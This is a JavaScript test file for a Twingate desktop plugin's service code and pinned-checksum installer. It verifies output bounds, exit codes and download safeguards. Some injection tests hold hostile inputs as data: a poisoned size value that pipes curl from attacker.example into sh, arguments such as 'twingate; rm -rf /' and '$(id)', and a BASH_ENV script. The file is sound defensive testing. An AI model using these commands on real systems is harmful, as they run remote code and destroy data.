test("an intent is recorded only when the action actually launched", () => {
  // _desired moves the switch. Setting it for an action the guard refused
  // showed the new position, did nothing, and snapped back 30s later.
  const fn = SERVICE.slice(SERVICE.indexOf("function toggleConnection"))
  const body = fn.slice(0, fn.indexOf("\n  }"))
  const assignments = body.match(/_desired = \d/g) || []
  assert.ok(assignments.length >= 3, `expected every branch to set an intent, saw ${assignments.length}`)
  for (const line of body.split("\n")) {
    if (!/_desired = \d/.test(line)) continue
    assert.ok(/\?\s*\(_desired/.test(line),
      `_desired is set unconditionally, not on a launched action: ${line.trim()}`)
  }
})

test("the IPC connect verbs report what happened, not always success", () => {
  // Returning "ok" for an action the busy guard refused told a script the
  // opposite of the truth.
  for (const verb of ["connect", "disconnect"]) {
    const fn = PANEL.slice(PANEL.indexOf(`function ${verb}(): string {`))
    const body = fn.slice(0, fn.indexOf("\n    }"))
    assert.ok(/return "not-installed"/.test(body), `${verb} must report not-installed`)
    assert.ok(/\?\s*"ok"\s*:\s*"busy"/.test(body), `${verb} must distinguish ok from busy`)
  }
})

test("a failed resource listing surfaces its error instead of going quiet", () => {
  // The stderr collector was declared and never read, so a listing that failed
  // outright left the last good list on screen with nothing saying it was stale.
  assert.ok(/resourcesStderr/.test(SERVICE), "no stderr collector for the listing")
  const fn = SERVICE.slice(SERVICE.indexOf("id: resourcesStdout"))
  const body = fn.slice(0, fn.indexOf("\n  }"))
  assert.ok(/resourcesStderr\.text/.test(body), "the listing's stderr is collected but never read")
  assert.ok(/root\.lastError\s*=/.test(body), "a failed listing must surface something")
})

// ── The installer, actually executed ──────────────────────────────────
// String-asserting the rendered script proves what it SAYS, not what it DOES.
// This runs it, with curl/sha256sum/sudo/pacman stubbed onto PATH, and checks
// which of them the script reaches.

function runInstallScript(arch, curlBehaviour) {
  const os = require("node:os")
  const cp = require("node:child_process")
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-install-"))
  const stub = (name, body) => {
    const f = path.join(dir, name)
    fs.writeFileSync(f, "#!/bin/bash\n" + body + "\n")
    fs.chmodSync(f, 0o755)
  }
  stub("uname", `echo ${arch}`)
  stub("sudo", 'echo "SUDO-REACHED: $*"')
  stub("pacman", 'echo "PACMAN-REACHED: $*"')
  stub("curl", curlBehaviour)
  const script = path.join(dir, "install.sh")
  fs.writeFileSync(script, renderInstallScript())
  const out = cp.execFileSync("bash", [script], {
    env: { ...process.env, PATH: dir + ":" + process.env.PATH },
    encoding: "utf8", stdio: ["ignore", "pipe", "pipe"]
  })
  fs.rmSync(dir, { recursive: true, force: true })
  return out
}

// Writes whatever it is given to the -o path, so the checksum decides.
const CURL_WRITES = (payload) =>
  `for a in "$@"; do [ "$prev" = "-o" ] && out="$a"; prev="$a"; done\n` +
  `printf '%s' ${payload} > "$out"`

test("an unpinned architecture refuses without downloading anything", () => {
  const out = runInstallScript("riscv64", 'echo "CURL-REACHED"; exit 1')
  assert.match(out, /No pinned Twingate build for riscv64/)
  assert.ok(!out.includes("CURL-REACHED"), "must not download for an unpinned arch")
  assert.ok(!out.includes("PACMAN-REACHED"), "must not install for an unpinned arch")
})

test("a failed download never reaches the package manager", () => {
  const out = runInstallScript("x86_64", "exit 22")
  assert.match(out, /Download failed/)
  assert.ok(!out.includes("PACMAN-REACHED"), "a failed download must not install")
})

test("tampered bytes are refused before the package manager sees them", () => {
  // The whole point of the pin: the published bytes must not be able to change
  // independently of the reviewed commit.
  const out = runInstallScript("x86_64", CURL_WRITES("'TAMPERED'"))
  assert.match(out, /CHECKSUM MISMATCH/)
  assert.ok(!out.includes("PACMAN-REACHED"), "tampered bytes must never reach pacman")
  assert.ok(!out.includes("SUDO-REACHED"), "tampered bytes must never reach sudo")
})

test("the install is offered for confirmation, never forced", () => {
  // Bytes whose digest matches the pin. Generated here so the test carries no
  // 10 MB fixture: the script only ever compares against `sum`.
  const good = "the-real-package-bytes"
  const digest = require("node:crypto").createHash("sha256").update(good).digest("hex")
  const src = fs.readFileSync(path.join(__dirname, "..", "Model.js"), "utf8")
  const real = Model.CLIENT_BUILDS.x86_64.sha256
  assert.ok(src.includes(real), "the pinned digest must come from Model.js")
  // Swap only the digest, so every other line of the script is the real one.
  const patched = renderInstallScript().replace(real, digest)
  const os = require("node:os"), cp = require("node:child_process")
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-install-"))
  for (const [n, b] of [["uname", "echo x86_64"], ["sudo", 'echo "SUDO-REACHED: $*"'],
                        ["pacman", 'echo "PACMAN-REACHED: $*"'], ["curl", CURL_WRITES("'" + good + "'")]]) {
    fs.writeFileSync(path.join(dir, n), "#!/bin/bash\n" + b + "\n"); fs.chmodSync(path.join(dir, n), 0o755)
  }
  fs.writeFileSync(path.join(dir, "i.sh"), patched)
  const out = cp.execFileSync("bash", [path.join(dir, "i.sh")], {
    env: { ...process.env, PATH: dir + ":" + process.env.PATH }, encoding: "utf8" })
  fs.rmSync(dir, { recursive: true, force: true })
  assert.match(out, /SUDO-REACHED: pacman -U/, "verified bytes must reach the installer")
  assert.ok(!out.includes("--noconfirm"), "the user must confirm the install")
})

// ── The producer-side bound, actually executed ────────────────────────
// A marketplace reviewer rejected the previous build for capping process
// output in onExited: StdioCollector has no size limit, so by the time that
// clamp ran the shell had already buffered everything. The bound now lives in
// the shell command itself. String-asserting it would prove what it says, so
// these run it.

function extractFunction(name) {
  // Brace-matching that is aware of strings, line comments AND regex literals.
  // Comment-awareness is not decoration: an apostrophe in a comment ("the
  // shell's environment") reads as an unterminated string, and the extractor
  // then swallows the rest of the file and hands `new Function` a syntax
  // error. Regex literals matter for the same reason -- the source contains
  // /^[A-Za-z0-9_.-]+$/ inside these functions.
  const src = SERVICE.slice(SERVICE.indexOf("function " + name))
  let depth = 0, i = src.indexOf("{"), seen = false
  while (i < src.length) {
    const c = src[i], next = src[i + 1]
    if (c === "/" && next === "/") {                 // line comment
      const nl = src.indexOf("\n", i)
      i = nl === -1 ? src.length : nl
      continue
    }
    if (c === "/" && next === "*") {                 // block comment
      const end = src.indexOf("*/", i + 2)
      i = end === -1 ? src.length : end + 2
      continue
    }
    if (c === '"' || c === "'") {                    // string literal
      i++
      while (i < src.length && src[i] !== c) i += src[i] === "\\" ? 2 : 1
      i++
      continue
    }
    if (c === "/") {                                 // regex literal
      i++
      while (i < src.length && src[i] !== "/") i += src[i] === "\\" ? 2 : 1
      i++
      continue
    }
    if (c === "{") { depth++; seen = true }
    else if (c === "}") { depth--; if (seen && depth === 0) { i++; break } }
    i++
  }
  return src.slice(0, i)
}

const bounded = (() => {
  const logged = []
  const fn = new Function("Model", "_log",
    extractFunction("_bounded") + "; return _bounded")(Model, (m) => logged.push(m))
  return { fn, logged }
})()

// Runs a real command through the real wrapper and reports both streams and
// the exit code separately, which is the whole point of the fd swap.
function runBounded(argv, dir) {
  const cp = require("node:child_process")
  const cmd = bounded.fn(argv)
  assert.ok(cmd.length > 0, "wrapper refused a legitimate command")
  const r = cp.spawnSync(cmd[0], cmd.slice(1), {
    env: { ...process.env, PATH: dir + ":" + process.env.PATH },
    encoding: "utf8", maxBuffer: 32 * 1024 * 1024
  })
  return { out: r.stdout, err: r.stderr, code: r.status }
}

function stubDir() {
  const os = require("node:os")
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-bound-"))
  const write = (name, body) => {
    const f = path.join(dir, name)
    fs.writeFileSync(f, "#!/bin/bash\n" + body + "\n")
    fs.chmodSync(f, 0o755)
  }
  // Writes to both streams and exits non-zero, like the real CLI does for
  // several ordinary states.
  write("tgstub", 'printf OUT; printf ERR >&2; exit 3')
  write("tgflood-out", 'exec yes AAAA')
  write("tgflood-err", 'exec yes BBBB >&2')
  write("tgflood-both", 'yes CCCC & yes DDDD >&2')
  // Well-formed resource rows, far past the bound, so the parser sees a real
  // table rather than a wall of one character.
  // FEW rows, each very long: the byte bound must be the thing that clips,
  // not the MAX_RESOURCES row cap. A 400-row fixture sets `truncated` via the
  // row cap and passes whatever the byte bound does -- which is how the first
  // version of this test managed to survive the very regression it targets.
  write("tgflood-rows",
    'printf "Name\\tAddress\\tAuth\\n"; i=0; while [ $i -lt 150 ]; do ' +
    'printf "res%s\\t%s.example.com\\tAuthenticated\\n" "$i" "$(printf \'a%.0s\' $(seq 1 9000))"; ' +
    'i=$((i+1)); done')
  return dir
}

test("the wrapper does not source BASH_ENV", () => {
  // Non-interactive `bash -c` sources $BASH_ENV before running its script.
  // Verified by execution rather than trusted: the fixture writes a marker,
  // and the wrapper must not run it.
  const os = require("node:os")
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-benv-"))
  const marker = path.join(dir, "marker")
  fs.writeFileSync(path.join(dir, "evil.sh"), `printf INJECTED > ${marker}\n`)
  const cp = require("node:child_process")
  const cmd = bounded.fn(["true"])
  cp.spawnSync(cmd[0], cmd.slice(1), {
    env: { ...process.env, BASH_ENV: path.join(dir, "evil.sh"), ENV: path.join(dir, "evil.sh") },
    encoding: "utf8"
  })
  assert.ok(!fs.existsSync(marker), "the wrapper sourced BASH_ENV")
  // Control: prove the fixture WOULD fire without the guard, so this test
  // cannot pass because the fixture is simply broken.
  cp.spawnSync("bash", ["-c", "true"], {
    env: { ...process.env, BASH_ENV: path.join(dir, "evil.sh") }, encoding: "utf8"
  })
  assert.ok(fs.existsSync(marker), "fixture never fired; the test proves nothing")
  fs.rmSync(dir, { recursive: true, force: true })
})

test("the wrapper keeps stdout and stderr separate", () => {
  // They must not be merged: normalizeStatus parses stdout for a state token,
  // so stderr noise reaching it would be read as a connection state.
  const dir = stubDir()
  const r = runBounded(["tgstub"], dir)
  assert.equal(r.out, "OUT", "stdout was polluted")
  assert.equal(r.err, "ERR", "stderr was polluted")
  fs.rmSync(dir, { recursive: true, force: true })
})

test("the wrapper preserves the CLI's own exit code", () => {
  // Every onExited handler treats exitCode as load-bearing -- installed is
  // literally `exitCode === 0`, and refreshResources only replaces a good list
  // when the command succeeded. A naive pipe would report head's status (0)
  // and silently turn every CLI failure into a success.
  const dir = stubDir()
  assert.equal(runBounded(["tgstub"], dir).code, 3, "exit code was masked by the pipeline")
  assert.equal(runBounded(["true"], dir).code, 0, "success was not reported as success")
  assert.equal(runBounded(["false"], dir).code, 1, "failure was not reported as failure")
  fs.rmSync(dir, { recursive: true, force: true })
})

test("a flood on either stream is cut off at READ_LIMIT", () => {
  const dir = stubDir()
  const o = runBounded(["tgflood-out"], dir)
  assert.equal(o.out.length, Model.READ_LIMIT, "stdout was not bounded")
  const e = runBounded(["tgflood-err"], dir)
  assert.equal(e.err.length, Model.READ_LIMIT, "stderr was not bounded")
  // Both at once: neither stream may borrow the other's headroom.
  const b = runBounded(["tgflood-both"], dir)
  assert.equal(b.out.length, Model.READ_LIMIT, "stdout unbounded while stderr flooded")
  assert.equal(b.err.length, Model.READ_LIMIT, "stderr unbounded while stdout flooded")
  fs.rmSync(dir, { recursive: true, force: true })
})

test("an over-long listing is still REPORTED as truncated through the real pipeline", () => {
  // The regression this pair of bounds exists to prevent, and the one the
  // round-2 test could not see because it fed parseResources directly.
  // Capping the producer at MAX_INPUT made `input.length > MAX_INPUT` false
  // for the ASCII the CLI emits, so a cut list rendered as a complete one --
  // a fix silently disabling an earlier fix. Push the fixture through the
  // REAL wrapper, exactly as a poll does.
  const dir = stubDir()
  const r = runBounded(["tgflood-rows"], dir)
  assert.equal(r.out.length, Model.READ_LIMIT, "fixture did not reach the bound")
  const parsed = Model.parseResources(r.out.slice(0, Model.READ_LIMIT))
  assert.equal(parsed.truncated, true,
    "a clipped listing was presented as complete")
  assert.ok(parsed.length > 0, "clipping must not empty the list")
  // The flag must come from the BYTE clip, not the row cap -- otherwise this
  // test passes no matter what the byte bound does.
  assert.ok(parsed.length < Model.MAX_RESOURCES,
    "row cap reached, so this fixture cannot isolate the byte clip")
  // And an ordinary listing must NOT be marked truncated.
  const small = Model.parseResources("Name\tAddress\tAuth\nweb\tweb.example.com\tAuthenticated")
  assert.ok(!small.truncated, "a short listing was wrongly marked truncated")
  fs.rmSync(dir, { recursive: true, force: true })
})

test("a runaway CLI is killed, not absorbed", () => {
  // The point of bounding the producer rather than the consumer: head closes
  // the pipe, the CLI takes SIGPIPE and dies. If this ever hangs instead, the
  // test times out -- which is the failure we want to see.
  const dir = stubDir()
  const r = runBounded(["tgflood-out"], dir)
  assert.notEqual(r.code, 0, "a killed producer must not report success")
  const cp = require("node:child_process")
  const leaked = cp.spawnSync("pgrep", ["-x", "yes"], { encoding: "utf8" })
  assert.notEqual(leaked.status, 0, "the runaway producer outlived the wrapper")
  fs.rmSync(dir, { recursive: true, force: true })
})

test("the wrapper refuses an argument it did not expect", () => {
  // It renders into a shell string, so it validates rather than trusts --
  // the same rule the CLIENT_BUILDS loop follows.
  for (const bad of ["twingate; rm -rf /", "$(id)", "a b", "`id`", "x|y", ">out"]) {
    assert.deepEqual(bounded.fn(["twingate", bad]), [],
      `wrapper accepted ${JSON.stringify(bad)}`)
  }
  assert.ok(bounded.fn(["twingate", "resources", "-d", "--all"]).length > 0,
    "wrapper rejected the real resources command")
})

test("every collected process is launched through the wrapper", () => {
  // The bound is worthless if a future edit assigns a raw argv again, which is
  // exactly what the rejected build did.
  for (const proc of ["statusProcess", "verboseProcess", "resourcesProcess"]) {
    const assigns = SERVICE.match(new RegExp(proc + "\\.command = [^\\n]*", "g")) || []
    assert.equal(assigns.length, 1, `${proc} is assigned ${assigns.length} times`)
    assert.ok(/= cmd$/.test(assigns[0].trim()),
      `${proc} bypasses the wrapper: ${assigns[0].trim()}`)
  }
  // And the wrapper's result must be checked before it is used.
  assert.equal((SERVICE.match(/if \(cmd\.length === 0\) return/g) || []).length, 3,
    "a refused command would be launched anyway")
})

// ── The download ceiling ──────────────────────────────────────────────

test("the installer caps the transfer at the exact pinned size", () => {
  // The digest already fixes the byte count, but it cannot say so until curl
  // has finished writing. This is that same bound applied on the wire.
  const script = renderInstallScript()
  for (const arch of Object.keys(Model.CLIENT_BUILDS)) {
    const bytes = Model.CLIENT_BUILDS[arch].bytes
    assert.ok(Number.isInteger(bytes) && bytes > 0, `${arch} has no pinned size`)
    assert.ok(script.includes("max='" + bytes + "'"), `${arch} size is not rendered`)
  }
  assert.ok(/--max-filesize\s+"\$max"/.test(script), "the ceiling is never passed to curl")
  // A ceiling applied after the write would be no ceiling at all.
  assert.ok(script.indexOf("--max-filesize") < script.indexOf("sha256sum"),
    "the ceiling is applied after verification")
})

test("the installer will not let a redirect change scheme or loop", () => {
  const script = renderInstallScript()
  assert.ok(/--proto '=https'/.test(script), "no scheme restriction")
  assert.ok(/--proto-redir '=https'/.test(script), "a redirect could downgrade the scheme")
  assert.ok(/--max-redirs \d+/.test(script), "the redirect chain is unbounded")
})

test("a build entry with a malformed size is refused, not rendered", () => {
  const poisoned = {
    x86_64: Model.CLIENT_BUILDS.x86_64,
    evil: {
      file: "twingate-amd64.pkg.tar.zst",
      sha256: "0".repeat(64),
      bytes: "1'; curl http://attacker.example/x | sh; #"
    }
  }
  const script = renderInstallScript(poisoned)
  assert.ok(!script.includes("attacker.example"), "an injected size reached the shell")
  assert.ok(!/'evil'\)/.test(script), "the malformed entry was rendered anyway")
  // The legitimate entry beside it must still be there.
  assert.ok(script.includes(Model.CLIENT_BUILDS.x86_64.sha256), "x86_64 was wrongly dropped")
})

test("curl is actually handed the ceiling at run time", () => {
  // Rendering proves the flag is in the string; this proves curl receives it
  // with the right value, and that pacman still gets the verified file.
  const os = require("node:os")
  const cp = require("node:child_process")
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "tw-ceiling-"))
  const stub = (name, body) => {
    const f = path.join(dir, name)
    fs.writeFileSync(f, "#!/bin/bash\n" + body + "\n")
    fs.chmodSync(f, 0o755)
  }
  stub("uname", "echo x86_64")
  stub("sudo", 'echo "SUDO-REACHED: $*"')
  stub("pacman", 'echo "PACMAN-REACHED"')
  stub("curl", 'echo "CURL-ARGS: $*" >&2; exit 22')
  const script = path.join(dir, "i.sh")
  fs.writeFileSync(script, renderInstallScript())
  const r = cp.spawnSync("bash", [script], {
    env: { ...process.env, PATH: dir + ":" + process.env.PATH }, encoding: "utf8"
  })
  const args = (r.stderr.match(/CURL-ARGS: .*/) || [""])[0]
  assert.ok(args.includes("--max-filesize " + Model.CLIENT_BUILDS.x86_64.bytes),
    `curl did not receive the pinned ceiling: ${args}`)
  assert.ok(args.includes("--proto-redir =https"), `curl did not receive the scheme limit: ${args}`)
  assert.ok(!/PACMAN-REACHED/.test(r.stdout), "a refused download still reached pacman")
  fs.rmSync(dir, { recursive: true, force: true })
})

// ── QML rules that no JS test and no validator will catch ─────────────

test("no property name begins with a capital", () => {
  // Not style -- a hard QML rule. `readonly property int MIN_LAUNCH_GAP_MS`
  // shipped in the previous round and made Service.qml fail to parse, which
  // took the whole plugin down: "Type Service unavailable", no bar widget at
  // all. It survived 72 passing tests AND `omarchy plugin validate`, because
  // neither one loads the QML. The only reason it was found was restarting a
  // real shell and reading the log.
  for (const file of ["Service.qml", "Panel.qml", "TwingateIcon.qml"]) {
    const src = fs.readFileSync(path.join(__dirname, "..", file), "utf8")
    const bad = src.match(/^\s*(?:readonly\s+|required\s+|default\s+)*property\s+[\w<>]+\s+[A-Z]\w*/gm) || []
    assert.deepEqual(bad, [], `${file} declares a property beginning with a capital`)
  }
})

test("every QML file the manifest points at exists and is non-empty", () => {
  const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "manifest.json"), "utf8"))
  for (const entry of Object.values(manifest.entryPoints || {})) {
    const p = path.join(__dirname, "..", entry)
    assert.ok(fs.existsSync(p), `entry point ${entry} does not exist`)
    assert.ok(fs.statSync(p).size > 0, `entry point ${entry} is empty`)
  }
})


test("a malformed CLIENT_VERSION is refused rather than rendered", () => {
  // The build table is validated per entry; the version is rendered too --
  // into url='...' and, at the echo, inside DOUBLE quotes where $(...) runs.
  // It was the one value taken on trust.
  const src = SERVICE.slice(SERVICE.indexOf("function installClient"))
  const body = extractFunction("installClient")
  for (const bad of ["1.0 $(id)", "1.0 `id`", "../../etc", "1.0; rm -rf /"]) {
    let captured = null
    const model = Object.assign(Object.create(null), Model, { CLIENT_VERSION: bad })
    new Function("Model", "runInTerminal", "_log", body + "; installClient()")(
      model, (c) => { captured = c }, () => {})
    assert.equal(captured, null, `installClient rendered a malformed version: ${bad}`)
  }
  // The real version must still render.
  assert.ok(renderInstallScript().includes(Model.CLIENT_VERSION), "the real version was refused")
})

test("diagnostics cannot report resources for a disconnected client", () => {
  // refreshResources returned on !wantResources BEFORE clearing the list, so
  // closing the panel and then disconnecting left the last good list in place.
  // The UI gates every resource binding on `connected`, but diagnostics -- the
  // agent-facing verb -- reports the count unconditionally.
  const body = extractFunction("refreshResources")
  const self = {
    resourcesProcess: { running: false, command: null },
    wantResources: false,
    connected: false,
    resources: [{ name: "web" }, { name: "db" }],
    resourceScope: "default",
    _bounded: () => ["bash"],
    _armPollWatchdog() {}
  }
  new Function("self", `with (self) { ${body}; refreshResources() }`)(self)
  assert.deepEqual(self.resources, [],
    "a disconnected client kept its resource list")
})
